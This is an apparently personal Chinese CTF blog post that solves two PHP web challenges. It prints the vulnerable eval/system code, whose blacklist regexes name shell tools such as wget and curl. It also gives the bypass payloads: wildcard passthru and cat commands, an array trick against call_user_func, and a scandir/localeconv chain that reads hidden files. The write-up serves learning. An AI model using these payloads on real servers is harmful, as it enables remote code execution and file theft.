---
layout:    post
title:     第二周
subtitle:  学习学习
date:      2021-07-26
author:    lll-yz
header-img: img/post-bg-coffee.jpg
catalog:    true
tags:
    - CTF
---

### web02

```PHP
 <?php
#-*-coding: utf-8 -*-
//flag in show_flag.php
if(isset($_POST['a'])){
    $a=$_POST['a'];
    if (!(preg_match("/[0-9]|\.|data|phar|glob|\*|system|shell_exec|shell|php|\`/i", $a))) {
        eval($a);
    }
}else{
    highlight_file(__FILE__);
}

?> 
```

用``?``去匹配：

```
a=passthru%28"cat ?????????????"%29%3B
```

[![WhpfV1.png](https://z3.ax1x.com/2021/07/26/WhpfV1.png)](https://imgtu.com/i/WhpfV1)

查看源码，得到：

```
<?php
error_reporting(0);
class FLAG {
    static function printflag()
    {
        include('flag.php');
        highlight_file('flag.php');
    }
}
if(isset($_GET['zz'])){
    $z=$_GET['zz'];
    if(@stripos($z,':')>1){
        die('hacker!');
    }
    @call_user_func($z);
}
```

可以采用数组的方式绕过对``:``的判断。

payload：``show_flag.php?zz[0]=FLAG&zz[1]=printflag``。

得到字符串，先HTML实体解码，再base64解码，得到flag。

### web05

进入后先随便get传参c一个数，得到：

```
flag is in flag.php ?c=1 <?php
echo "flag is in flag.php  ?c=";
$c=$_GET['c'];
echo "$c"."\n";
echo "\n";


if(!preg_match("/\{|\}|.*t.*a.*c|.*l.*s.*|.*p.*a.*s.*t.e.*|.*m.*v|\;|.*c.*a.*t.*|.*f.*l.*a.*g.*|[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\<|\||\*|\(|\)/i", $c)){
            system($c);
} else{
        highlight_file(__FILE__);
}

?>
```

发现过滤的很全面，但还是有漏掉的，使用``grep ????.php``去搜索文件，得到:

[![Wh9ooq.png](https://z3.ax1x.com/2021/07/26/Wh9ooq.png)](https://imgtu.com/i/Wh9ooq)

访问aGho.php:

```

<?php


if(isset($_GET['c'])){
        $c = $_GET['c'];
            if(!preg_match("/\`|\<|\>|\*|\"|\?|%|sess.*|eval|flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
                    eval($c);
                    }
            
}else{
        highlight_file(__FILE__);
}




?>
```

先使用未过滤的函数查看当前文件：``aGho.php?c=passthru(ls);``

[![WhCCY6.png](https://z3.ax1x.com/2021/07/26/WhCCY6.png)](https://imgtu.com/i/WhCCY6)

得到文件，当时就没有想到。

之后确实是和一个无参获取一样。发现文件只有huhuhu.php没有访问过，可以猜测flag在huhuhu.php中，且其位置也是在倒数第二，所以构造payload：

```
aGho.php?c=highlight_file(next(array_reverse(scandir(current(localeconv())))));
```

得到flag。